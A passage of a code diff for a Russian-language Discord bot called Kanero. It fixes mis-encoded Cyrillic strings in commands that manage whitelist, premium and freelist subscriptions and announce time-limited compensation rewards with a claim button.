+                        role = discord.utils.find(lambda r: r.name == "? White", home_guild.roles)
                         if role and role in member.roles:
                             await member.remove_roles(role, reason="wl_remove")
                     await update_stats_channels(home_guild)
         except Exception:
             pass
-        await ctx.send(f"вњ… **{user}** СѓР±СЂР°РЅ РёР· whitelist.")
+        await ctx.send(f"? **{user}** убран из whitelist.")
     else:
-        await ctx.send("РќРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send("Не найден.")
 
 
 @bot.command(name="wl_list")
@@ -1081,31 +1081,31 @@ async def wl_list(ctx):
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
     if not config.WHITELIST:
-        await ctx.send("Whitelist РїСѓСЃС‚.")
+        await ctx.send("Whitelist пуст.")
         return
     lines = []
     for uid in config.WHITELIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` вЂ” **{user}**")
+            lines.append(f"`{uid}` — **{user}**")
         except Exception:
-            lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
-    embed = discord.Embed(title="вњ… Whitelist", description="\n".join(lines), color=0x0a0a0a)
-    embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(config.WHITELIST)}")
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="? Whitelist", description="\n".join(lines), color=0x0a0a0a)
+    embed.set_footer(text=f"?? Kanero  |  Всего: {len(config.WHITELIST)}")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ OWNER-ONLY: PREMIUM в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- OWNER-ONLY: PREMIUM -----------------------------------
 
 @bot.command(name="pm_add")
 async def pm_add(ctx, *, user_input: str):
-    """Р”РѕР±Р°РІРёС‚СЊ РІ Premium. РўРѕР»СЊРєРѕ РґР»СЏ РІР»Р°РґРµР»СЊС†Р° СЃРµСЂРІРµСЂР°.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !pm_add @user [РґРЅРё] | !pm_add all [РґРЅРё]
+    """Добавить в Premium. Только для владельца сервера.
+    Использование: !pm_add @user [дни] | !pm_add all [дни]
     """
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
 
-    # РџР°СЂСЃРёРј РґР»РёС‚РµР»СЊРЅРѕСЃС‚СЊ РёР· РїРѕСЃР»РµРґРЅРµРіРѕ Р°СЂРіСѓРјРµРЅС‚Р°
+    # Парсим длительность из последнего аргумента
     parts = user_input.rsplit(maxsplit=1)
     duration_hours = None
     actual_input = user_input
@@ -1116,16 +1116,16 @@ async def pm_add(ctx, *, user_input: str):
         except (ValueError, Exception):
             actual_input = user_input
 
-    # Р РµР¶РёРј ALL вЂ” РІС‹РґР°С‚СЊ РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј РґРѕРјР°С€РЅРµРіРѕ СЃРµСЂРІРµСЂР°
+    # Режим ALL — выдать всем участникам домашнего сервера
     if actual_input.lower() == "all":
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if not home_guild:
-            await ctx.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+            await ctx.send("? Домашний сервер не найден.")
             return
-        msg = await ctx.send("вЏі Р’С‹РґР°СЋ Premium РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј...")
+        msg = await ctx.send("? Выдаю Premium всем участникам...")
         count = 0
-        prem_role = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium", home_guild.roles)
-        white_role = discord.utils.find(lambda r: r.name == "вњ… White", home_guild.roles)
+        prem_role = discord.utils.find(lambda r: r.name == "?? Premium", home_guild.roles)
+        white_role = discord.utils.find(lambda r: r.name == "? White", home_guild.roles)
         for member in home_guild.members:
             if member.bot:
                 continue
@@ -1148,22 +1148,22 @@ async def pm_add(ctx, *, user_input: str):
             save_premium()
             save_whitelist()
         days = duration_hours // 24 if duration_hours else 0
-        dur_text = f" РЅР° **{days} РґРЅ.**" if duration_hours else " РЅР°РІСЃРµРіРґР°"
-        await msg.edit(content=f"вњ… **Premium**{dur_text} РІС‹РґР°РЅ **{count}** СѓС‡Р°СЃС‚РЅРёРєР°Рј.")
+        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
+        await msg.edit(content=f"? **Premium**{dur_text} выдан **{count}** участникам.")
         return
 
-    # РћР±С‹С‡РЅС‹Р№ СЂРµР¶РёРј вЂ” РѕРґРёРЅ РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ
+    # Обычный режим — один пользователь
     user = await resolve_user(ctx, actual_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{actual_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{actual_input}` не найден.")
         return
     user_id = user.id
 
     if duration_hours:
         add_temp_subscription(user_id, "pm", duration_hours)
         days = duration_hours // 24
-        duration_text = f"{days} РґРЅ." if days > 0 else f"{duration_hours} С‡."
-        result_text = f"рџ’Ћ **{user}** РїРѕР»СѓС‡РёР» **Premium** РЅР° **{duration_text}** (РІСЂРµРјРµРЅРЅРѕ)."
+        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
+        result_text = f"?? **{user}** получил **Premium** на **{duration_text}** (временно)."
     else:
         if user_id not in PREMIUM_LIST:
             PREMIUM_LIST.append(user_id)
@@ -1174,10 +1174,10 @@ async def pm_add(ctx, *, user_input: str):
         if user_id in FREELIST:
             FREELIST.remove(user_id)
             save_freelist()
-        result_text = f"рџ’Ћ **{user}** (`{user_id}`) РїРѕР»СѓС‡РёР» **Premium** РЅР°РІСЃРµРіРґР°."
-        result_text = f"рџ’Ћ **{user}** (`{user_id}`) РїРѕР»СѓС‡РёР» **Premium** РЅР°РІСЃРµРіРґР°."
+        result_text = f"?? **{user}** (`{user_id}`) получил **Premium** навсегда."
+        result_text = f"?? **{user}** (`{user_id}`) получил **Premium** навсегда."
 
-    # Р’С‹РґР°С‘Рј СЂРѕР»СЊ
+    # Выдаём роль
     try:
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if home_guild:
@@ -1188,9 +1188,9 @@ async def pm_add(ctx, *, user_input: str):
                 except Exception:
                     member = None
             if member:
-                prem_role  = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium", home_guild.roles)
-                white_role = discord.utils.find(lambda r: r.name == "вњ… White",   home_guild.roles)
-                user_role  = discord.utils.find(lambda r: r.name == "рџ‘Ґ User",    home_guild.roles)
+                prem_role  = discord.utils.find(lambda r: r.name == "?? Premium", home_guild.roles)
+                white_role = discord.utils.find(lambda r: r.name == "? White",   home_guild.roles)
+                user_role  = discord.utils.find(lambda r: r.name == "?? User",    home_guild.roles)
                 roles_to_add    = [r for r in [prem_role, white_role] if r and r not in member.roles]
                 roles_to_remove = [r for r in [user_role] if r and r in member.roles]
                 if roles_to_add:
@@ -1205,12 +1205,12 @@ async def pm_add(ctx, *, user_input: str):
 
 @bot.command(name="pm_remove")
 async def pm_remove(ctx, *, user_input: str):
-    # РўРѕР»СЊРєРѕ РІР»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+    # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
     user = await resolve_user(ctx, user_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{user_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{user_input}` не найден.")
         return
     user_id = user.id
     if user_id in PREMIUM_LIST:
@@ -1221,15 +1221,15 @@ async def pm_remove(ctx, *, user_input: str):
             if home_guild:
                 member = home_guild.get_member(user_id)
                 if member:
-                    role = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium", home_guild.roles)
+                    role = discord.utils.find(lambda r: r.name == "?? Premium", home_guild.roles)
                     if role and role in member.roles:
                         await member.remove_roles(role, reason="pm_remove")
                 await update_stats_channels(home_guild)
         except Exception:
             pass
-        await ctx.send(f"вњ… **{user}** СѓР±СЂР°РЅ РёР· Premium.")
+        await ctx.send(f"? **{user}** убран из Premium.")
     else:
-        await ctx.send("РќРµ РЅР°Р№РґРµРЅ РІ Premium.")
+        await ctx.send("Не найден в Premium.")
 
 
 @bot.command(name="pm_list")
@@ -1242,18 +1242,18 @@ async def pm_list(ctx):
     for uid in PREMIUM_LIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` вЂ” **{user}**")
+            lines.append(f"`{uid}` — **{user}**")
         except Exception:
-            lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
+            lines.append(f"`{uid}` — *не найден*")
     for uid, s in temp_pm:
         if uid not in PREMIUM_LIST:
             try:
                 user = await bot.fetch_user(uid)
-                lines.append(f"`{uid}` вЂ” **{user}** вЏі <t:{int(s['expires'].timestamp())}:R>")
+                lines.append(f"`{uid}` — **{user}** ? <t:{int(s['expires'].timestamp())}:R>")
             except Exception:
-                lines.append(f"`{uid}` вЏі <t:{int(s['expires'].timestamp())}:R>")
-    embed = discord.Embed(title="рџ’Ћ Premium СЃРїРёСЃРѕРє", description="\n".join(lines) if lines else "*РїСѓСЃС‚Рѕ*", color=0x0a0a0a)
-    embed.set_footer(text=f"в пёЏ Kanero  |  РџРѕСЃС‚РѕСЏРЅРЅС‹С…: {len(PREMIUM_LIST)}  |  Р’СЂРµРјРµРЅРЅС‹С…: {len(temp_pm)}")
+                lines.append(f"`{uid}` ? <t:{int(s['expires'].timestamp())}:R>")
+    embed = discord.Embed(title="?? Premium список", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
+    embed.set_footer(text=f"?? Kanero  |  Постоянных: {len(PREMIUM_LIST)}  |  Временных: {len(temp_pm)}")
     await ctx.send(embed=embed)
 
 
@@ -1267,29 +1267,29 @@ async def fl_list(ctx):
     for uid in FREELIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` вЂ” **{user}**")
+            lines.append(f"`{uid}` — **{user}**")
         except Exception:
-            lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
+            lines.append(f"`{uid}` — *не найден*")
     for uid, s in temp_fl:
         if uid not in FREELIST:
             try:
                 user = await bot.fetch_user(uid)
-                lines.append(f"`{uid}` вЂ” **{user}** вЏі <t:{int(s['expires'].timestamp())}:R>")
+                lines.append(f"`{uid}` — **{user}** ? <t:{int(s['expires'].timestamp())}:R>")
             except Exception:
-                lines.append(f"`{uid}` вЏі <t:{int(s['expires'].timestamp())}:R>")
-    embed = discord.Embed(title="рџ“‹ Freelist", description="\n".join(lines) if lines else "*РїСѓСЃС‚Рѕ*", color=0x0a0a0a)
-    embed.set_footer(text=f"в пёЏ Kanero  |  РџРѕСЃС‚РѕСЏРЅРЅС‹С…: {len(FREELIST)}  |  Р’СЂРµРјРµРЅРЅС‹С…: {len(temp_fl)}")
+                lines.append(f"`{uid}` ? <t:{int(s['expires'].timestamp())}:R>")
+    embed = discord.Embed(title="?? Freelist", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
+    embed.set_footer(text=f"?? Kanero  |  Постоянных: {len(FREELIST)}  |  Временных: {len(temp_fl)}")
     await ctx.send(embed=embed)
 
 
 def _parse_duration(duration_str: str) -> int:
-    """РџР°СЂСЃРёС‚ СЃС‚СЂРѕРєСѓ РґР»РёС‚РµР»СЊРЅРѕСЃС‚Рё РІ С‡Р°СЃС‹. РџРѕРґРґРµСЂР¶РёРІР°РµС‚: 2d, 24h, 48, 1d12h Рё С‚.Рґ."""
+    """Парсит строку длительности в часы. Поддерживает: 2d, 24h, 48, 1d12h и т.д."""
     duration_str = duration_str.lower().strip()
     total_hours = 0
     import re
     matches = re.findall(r'(\d+)\s*([dh]?)', duration_str)
     if not matches:
-        raise ValueError(f"РќРµ СѓРґР°Р»РѕСЃСЊ СЂР°СЃРїРѕР·РЅР°С‚СЊ РґР»РёС‚РµР»СЊРЅРѕСЃС‚СЊ: `{duration_str}`")
+        raise ValueError(f"Не удалось распознать длительность: `{duration_str}`")
     for value, unit in matches:
         value = int(value)
         if unit == 'd':
@@ -1297,12 +1297,12 @@ def _parse_duration(duration_str: str) -> int:
         elif unit == 'h' or unit == '':
             total_hours += value
     if total_hours <= 0:
-        raise ValueError("Р”Р»РёС‚РµР»СЊРЅРѕСЃС‚СЊ РґРѕР»Р¶РЅР° Р±С‹С‚СЊ Р±РѕР»СЊС€Рµ 0")
+        raise ValueError("Длительность должна быть больше 0")
     return total_hours
 
 
 class CompensationView(discord.ui.View):
-    """РљРЅРѕРїРєР° РїРѕР»СѓС‡РµРЅРёСЏ РєРѕРјРїРµРЅСЃР°С†РёРё. Р Р°Р±РѕС‚Р°РµС‚ РїРѕРєР° РЅРµ РёСЃС‚РµС‡С‘С‚ РІСЂРµРјСЏ."""
+    """Кнопка получения компенсации. Работает пока не истечёт время."""
 
     def __init__(self, sub_type: str, hours: int, expires_at: datetime):
         super().__init__(timeout=None)
@@ -1311,26 +1311,26 @@ class CompensationView(discord.ui.View):
         self.expires_at = expires_at
         self.claimed: set[int] = set()
 
-        sub_names = {"wl": "вњ… White", "pm": "рџ’Ћ Premium", "fl": "рџ“‹ Freelist"}
+        sub_names = {"wl": "? White", "pm": "?? Premium", "fl": "?? Freelist"}
         self.sub_name = sub_names.get(sub_type, sub_type)
 
-    @discord.ui.button(label="рџЋЃ РџРѕР»СѓС‡РёС‚СЊ РєРѕРјРїРµРЅСЃР°С†РёСЋ", style=discord.ButtonStyle.green, custom_id="claim_comp_v2")
+    @discord.ui.button(label="?? Получить компенсацию", style=discord.ButtonStyle.green, custom_id="claim_comp_v2")
     async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
         user = interaction.user
 
-        # РџСЂРѕРІРµСЂСЏРµРј РЅРµ РёСЃС‚РµРєР»Рѕ Р»Рё РІСЂРµРјСЏ Р°РєС†РёРё
+        # Проверяем не истекло ли время акции
         if datetime.utcnow() > self.expires_at:
             await interaction.response.send_message(
                 embed=discord.Embed(
-                    title="вЏ° Р’СЂРµРјСЏ РёСЃС‚РµРєР»Рѕ",
-                    description="РЎСЂРѕРє РїРѕР»СѓС‡РµРЅРёСЏ СЌС‚РѕР№ РєРѕРјРїРµРЅСЃР°С†РёРё СѓР¶Рµ Р·Р°РєРѕРЅС‡РёР»СЃСЏ.",
+                    title="? Время истекло",
+                    description="Срок получения этой компенсации уже закончился.",
                     color=0xff6b6b
                 ),
                 ephemeral=True
             )
             return
 
-        # РЈР¶Рµ РїРѕР»СѓС‡РёР» вЂ” РїСЂРѕРІРµСЂСЏРµРј Рё РІ РїР°РјСЏС‚Рё Рё РІ TEMP_SUBSCRIPTIONS
+        # Уже получил — проверяем и в памяти и в TEMP_SUBSCRIPTIONS
         already_claimed = user.id in self.claimed
         if not already_claimed and user.id in TEMP_SUBSCRIPTIONS:
             sub = TEMP_SUBSCRIPTIONS[user.id]
@@ -1340,10 +1340,10 @@ class CompensationView(discord.ui.View):
         if already_claimed:
             await interaction.response.send_message(
                 embed=discord.Embed(
-                    title="вњ… Р’С‹ СѓР¶Рµ РїРѕР»СѓС‡РёР»Рё РєРѕРјРїРµРЅСЃР°С†РёСЋ",
+                    title="? Вы уже получили компенсацию",
                     description=(
-                        f"Р’С‹ СѓР¶Рµ РїРѕР»СѓС‡РёР»Рё **{self.sub_name}**.\n"
-                        f"РСЃРїРѕР»СЊР·СѓР№ `!help` С‡С‚РѕР±С‹ РїРѕСЃРјРѕС‚СЂРµС‚СЊ РґРѕСЃС‚СѓРїРЅС‹Рµ РєРѕРјР°РЅРґС‹."
+                        f"Вы уже получили **{self.sub_name}**.\n"
+                        f"Используй `!help` чтобы посмотреть доступные команды."
                     ),
                     color=0x2b2d31
                 ),
@@ -1353,14 +1353,14 @@ class CompensationView(discord.ui.View):
 
         self.claimed.add(user.id)
 
-        # Р’С‹РґР°С‘Рј РїРѕРґРїРёСЃРєСѓ
+        # Выдаём подписку
         add_temp_subscription(user.id, self.sub_type, self.hours)
 
-        # Р’С‹РґР°С‘Рј СЂРѕР»СЊ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+        # Выдаём роль на домашнем сервере
         home_guild = bot.get_guild(HOME_GUILD_ID)
         role_given = False
         if home_guild:
-            role_map = {"wl": "вњ… White", "pm": "рџ’Ћ Premium", "fl": "рџ‘Ґ User"}
+            role_map = {"wl": "? White", "pm": "?? Premium", "fl": "?? User"}
             role_name = role_map.get(self.sub_type)
             if role_name:
                 member = home_guild.get_member(user.id)
@@ -1373,44 +1373,44 @@ class CompensationView(discord.ui.View):
                     role = discord.utils.find(lambda r: r.name == role_name, home_guild.roles)
                     if role:
                         try:
-                            await member.add_roles(role, reason="РљРѕРјРїРµРЅСЃР°С†РёСЏ")
+                            await member.add_roles(role, reason="Компенсация")
                             role_given = True
                         except Exception:
                             pass
 
         days = self.hours // 24
-        duration_text = f"{days} РґРЅ." if days > 0 else f"{self.hours} С‡."
+        duration_text = f"{days} дн." if days > 0 else f"{self.hours} ч."
 
-        # РћС‚РІРµС‡Р°РµРј РїРѕР»СЊР·РѕРІР°С‚РµР»СЋ
+        # Отвечаем пользователю
         await interaction.response.send_message(
             embed=discord.Embed(
-                title="вњ… РљРѕРјРїРµРЅСЃР°С†РёСЏ РїРѕР»СѓС‡РµРЅР°!",
+                title="? Компенсация получена!",
                 description=(
-                    f"**РџРѕРґРїРёСЃРєР°:** {self.sub_name}\n"
-                    f"**Р”Р»РёС‚РµР»СЊРЅРѕСЃС‚СЊ:** {duration_text}\n"
-                    f"**РСЃС‚РµРєР°РµС‚:** <t:{int((datetime.utcnow() + timedelta(hours=self.hours)).timestamp())}:R>\n\n"
-                    f"{'Р РѕР»СЊ РІС‹РґР°РЅР° РЅР° СЃРµСЂРІРµСЂРµ.' if role_given else 'РСЃРїРѕР»СЊР·СѓР№ `!help` РґР»СЏ СЃРїРёСЃРєР° РєРѕРјР°РЅРґ.'}"
+                    f"**Подписка:** {self.sub_name}\n"
+                    f"**Длительность:** {duration_text}\n"
+                    f"**Истекает:** <t:{int((datetime.utcnow() + timedelta(hours=self.hours)).timestamp())}:R>\n\n"
+                    f"{'Роль выдана на сервере.' if role_given else 'Используй `!help` для списка команд.'}"
                 ),
                 color=0x00ff00
-            ).set_footer(text="в пёЏ Kanero  |  discord.gg/aud6wwYVRd"),
+            ).set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd"),
             ephemeral=True
         )
 
-        # РџРёС€РµРј РІ admin-chat
+        # Пишем в admin-chat
         if home_guild:
             admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
             if admin_ch:
                 try:
                     await admin_ch.send(
                         embed=discord.Embed(
-                            title="рџ’° РљРѕРјРїРµРЅСЃР°С†РёСЏ РїРѕР»СѓС‡РµРЅР°",
+                            title="?? Компенсация получена",
                             description=(
-                                f"**РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ:** {user.mention} (`{user.id}`)\n"
-                                f"**РџРѕРґРїРёСЃРєР°:** {self.sub_name}\n"
-                                f"**Р”Р»РёС‚РµР»СЊРЅРѕСЃС‚СЊ:** {duration_text}"
+                                f"**Пользователь:** {user.mention} (`{user.id}`)\n"
+                                f"**Подписка:** {self.sub_name}\n"
+                                f"**Длительность:** {duration_text}"
                             ),
                             color=0x00ff00
-                        ).set_footer(text="в пёЏ Kanero")
+                        ).set_footer(text="?? Kanero")
                     )
                 except Exception:
                     pass
@@ -1418,116 +1418,116 @@ class CompensationView(discord.ui.View):
 
 @bot.command(name="compensate")
 async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
-    """РћР±СЉСЏРІРёС‚СЊ РєРѕРјРїРµРЅСЃР°С†РёСЋ СЃ РєРЅРѕРїРєРѕР№ РїРѕР»СѓС‡РµРЅРёСЏ. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !compensate pm 1d
+    """Объявить компенсацию с кнопкой получения. Только для овнера.
+    Использование: !compensate pm 1d
     """
     if ctx.author.id != config.OWNER_ID:
         return
 
     if not sub_type or not duration_str:
         await ctx.send(
-            "вќЊ **РќРµРІРµСЂРЅРѕРµ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ.**\n"
-            "РџСЂР°РІРёР»СЊРЅРѕ: `!compensate <С‚РёРї> <РІСЂРµРјСЏ>`\n\n"
-            "**РўРёРїС‹:** `wl` вЂ” White В· `pm` вЂ” Premium В· `fl` вЂ” Freelist\n"
-            "**Р’СЂРµРјСЏ:** `2d` вЂ” 2 РґРЅСЏ В· `48h` вЂ” 48 С‡Р°СЃРѕРІ В· `24` вЂ” 24 С‡Р°СЃР°\n\n"
-            "**РџСЂРёРјРµСЂ:** `!compensate pm 1d`"
+            "? **Неверное использование.**\n"
+            "Правильно: `!compensate <тип> <время>`\n\n"
+            "**Типы:** `wl` — White · `pm` — Premium · `fl` — Freelist\n"
+            "**Время:** `2d` — 2 дня · `48h` — 48 часов · `24` — 24 часа\n\n"
+            "**Пример:** `!compensate pm 1d`"
         )
         return
 
     if sub_type.lower() not in ("wl", "pm", "fl"):
         await ctx.send(
-            f"вќЊ РќРµРІРµСЂРЅС‹Р№ С‚РёРї `{sub_type}`.\n"
-            "Р”РѕСЃС‚СѓРїРЅС‹Рµ С‚РёРїС‹: `wl` вЂ” White В· `pm` вЂ” Premium В· `fl` вЂ” Freelist"
+            f"? Неверный тип `{sub_type}`.\n"
+            "Доступные типы: `wl` — White · `pm` — Premium · `fl` — Freelist"
         )
         return
 
     try:
         hours = _parse_duration(duration_str)
     except ValueError as e:
-        await ctx.send(f"вќЊ {e}\nРџСЂРёРјРµСЂС‹: `2d` В· `48h` В· `24`")
+        await ctx.send(f"? {e}\nПримеры: `2d` · `48h` · `24`")
         return
 
-    sub_names = {"wl": "вњ… White", "pm": "рџ’Ћ Premium", "fl": "рџ“‹ Freelist"}
+    sub_names = {"wl": "? White", "pm": "?? Premium", "fl": "?? Freelist"}
     sub_name = sub_names[sub_type.lower()]
     days = hours // 24
-    duration_text = f"{days} РґРЅ. ({hours} С‡.)" if days > 0 else f"{hours} С‡."
+    duration_text = f"{days} дн. ({hours} ч.)" if days > 0 else f"{hours} ч."
 
-    # Р’СЂРµРјСЏ РёСЃС‚РµС‡РµРЅРёСЏ Р°РєС†РёРё вЂ” 1 РґРµРЅСЊ РЅР° РїРѕР»СѓС‡РµРЅРёРµ
+    # Время истечения акции — 1 день на получение
     claim_deadline = datetime.utcnow() + timedelta(days=1)
 
-    # РС‰РµРј РєР°РЅР°Р» РєРѕРјРїРµРЅСЃР°С†РёРё РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # Ищем канал компенсации на домашнем сервере
     home_guild = bot.get_guild(HOME_GUILD_ID)
     if not home_guild:
-        await ctx.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send("? Домашний сервер не найден.")
         return
 
-    comp_ch = discord.utils.find(lambda c: "РєРѕРјРїРµРЅСЃР°С†" in c.name.lower(), home_guild.text_channels)
+    comp_ch = discord.utils.find(lambda c: "компенсац" in c.name.lower(), home_guild.text_channels)
     if not comp_ch:
-        await ctx.send("вќЊ РљР°РЅР°Р» РєРѕРјРїРµРЅСЃР°С†РёРё РЅРµ РЅР°Р№РґРµРЅ (РЅСѓР¶РµРЅ РєР°РЅР°Р» СЃ 'РєРѕРјРїРµРЅСЃР°С†' РІ РЅР°Р·РІР°РЅРёРё).")
+        await ctx.send("? Канал компенсации не найден (нужен канал с 'компенсац' в названии).")
         return
 
     embed = discord.Embed(
-        title="рџЋЃ РљРѕРјРїРµРЅСЃР°С†РёСЏ РґР»СЏ РІСЃРµС…!",
+        title="?? Компенсация для всех!",
         description=(
-            f"**РџРѕРґРїРёСЃРєР°:** {sub_name}\n"
-            f"**Р”Р»РёС‚РµР»СЊРЅРѕСЃС‚СЊ:** {duration_text}\n"
-            f"**РџРѕР»СѓС‡РёС‚СЊ РґРѕ:** <t:{int(claim_deadline.timestamp())}:R>\n\n"
-            "РќР°Р¶РјРё РєРЅРѕРїРєСѓ РЅРёР¶Рµ С‡С‚РѕР±С‹ РїРѕР»СѓС‡РёС‚СЊ РїРѕРґРїРёСЃРєСѓ Рё СЂРѕР»СЊ РЅР° СЃРµСЂРІРµСЂРµ."
+            f"**Подписка:** {sub_name}\n"
+            f"**Длительность:** {duration_text}\n"
+            f"**Получить до:** <t:{int(claim_deadline.timestamp())}:R>\n\n"
+            "Нажми кнопку ниже чтобы получить подписку и роль на сервере."
         ),
         color=0xffd700
     )
-    embed.set_footer(text="в пёЏ Kanero  |  РљРѕРјРїРµРЅСЃР°С†РёСЏ Р·Р° РЅР°Р№РґРµРЅРЅС‹Р№ Р±Р°Рі")
+    embed.set_footer(text="?? Kanero  |  Компенсация за найденный баг")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     view = CompensationView(sub_type.lower(), hours, claim_deadline)
     comp_msg = await comp_ch.send(content="@everyone", embed=embed, view=view)
 
-    # РђРЅРѕРЅСЃ РІ РЅРѕРІРѕСЃС‚СЏС…
+    # Анонс в новостях
     news_ch = discord.utils.find(
-        lambda c: "РЅРѕРІРѕСЃС‚" in c.name.lower() or "news" in c.name.lower(),
+        lambda c: "новост" in c.name.lower() or "news" in c.name.lower(),
         home_guild.text_channels
     )
     if news_ch:
         try:
             news_embed = discord.Embed(
-                title="рџЋЃ Р”РѕСЃС‚СѓРїРЅР° РєРѕРјРїРµРЅСЃР°С†РёСЏ!",
+                title="?? Доступна компенсация!",
                 description=(
-                    f"Р”Р»СЏ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ РґРѕСЃС‚СѓРїРЅР° Р±РµСЃРїР»Р°С‚РЅР°СЏ РїРѕРґРїРёСЃРєР° **{sub_name}** РЅР° {duration_text}!\n\n"
-                    f"РџРµСЂРµР№РґРё РІ {comp_ch.mention} Рё РЅР°Р¶РјРё РєРЅРѕРїРєСѓ С‡С‚РѕР±С‹ РїРѕР»СѓС‡РёС‚СЊ.\n\n"
-                    f"**РџРѕР»СѓС‡РёС‚СЊ РґРѕ:** <t:{int(claim_deadline.timestamp())}:R>"
+                    f"Для всех участников доступна бесплатная подписка **{sub_name}** на {duration_text}!\n\n"
+                    f"Перейди в {comp_ch.mention} и нажми кнопку чтобы получить.\n\n"
+                    f"**Получить до:** <t:{int(claim_deadline.timestamp())}:R>"
                 ),
                 color=0xffd700
             )
-            news_embed.set_footer(text="в пёЏ Kanero  |  РќР°Р¶РјРё РєРЅРѕРїРєСѓ РІ РєР°РЅР°Р»Рµ РєРѕРјРїРµРЅСЃР°С†РёРё")
+            news_embed.set_footer(text="?? Kanero  |  Нажми кнопку в канале компенсации")
             news_embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await news_ch.send(content="@everyone", embed=news_embed)
         except Exception:
             pass
 
-    # РЈРІРµРґРѕРјР»СЏРµРј РІ admin-chat
+    # Уведомляем в admin-chat
     admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
     if admin_ch:
         try:
             await admin_ch.send(
                 embed=discord.Embed(
-                    title="рџ“ў РљРѕРјРїРµРЅСЃР°С†РёСЏ РѕР±СЉСЏРІР»РµРЅР°",
+                    title="?? Компенсация объявлена",
                     description=(
-                        f"**РўРёРї:** {sub_name}\n"
-                        f"**Р”Р»РёС‚РµР»СЊРЅРѕСЃС‚СЊ:** {duration_text}\n"
-                        f"**РљР°РЅР°Р»:** {comp_ch.mention}\n"
-                        f"**РџРѕР»СѓС‡РёС‚СЊ РґРѕ:** <t:{int(claim_deadline.timestamp())}:R>"
+                        f"**Тип:** {sub_name}\n"
+                        f"**Длительность:** {duration_text}\n"
+                        f"**Канал:** {comp_ch.mention}\n"
+                        f"**Получить до:** <t:{int(claim_deadline.timestamp())}:R>"
                     ),
                     color=0xffd700
-                ).set_footer(text=f"РћР±СЉСЏРІРёР»: {ctx.author}")
+                ).set_footer(text=f"Объявил: {ctx.author}")
             )
         except Exception:
             pass
 
-    await ctx.message.delete()  # СѓРґР°Р»СЏРµРј РєРѕРјР°РЅРґСѓ С‡С‚РѕР±С‹ РЅРµ Р·Р°СЃРѕСЂСЏС‚СЊ РєР°РЅР°Р»
+    await ctx.message.delete()  # удаляем команду чтобы не засорять канал
 
-    # РўР°СЃРє вЂ” С‡РµСЂРµР· 24 С‡Р°СЃР° РЅР°РїРѕРјРЅРёС‚СЊ РІ admin-chat СѓРґР°Р»РёС‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ
+    # Таск — через 24 часа напомнить в admin-chat удалить сообщение
     async def remind_delete():
-        await asyncio.sleep(86400)  # 24 С‡Р°СЃР°
+        await asyncio.sleep(86400)  # 24 часа
         try:
             hg = bot.get_guild(HOME_GUILD_ID)
             if not hg:
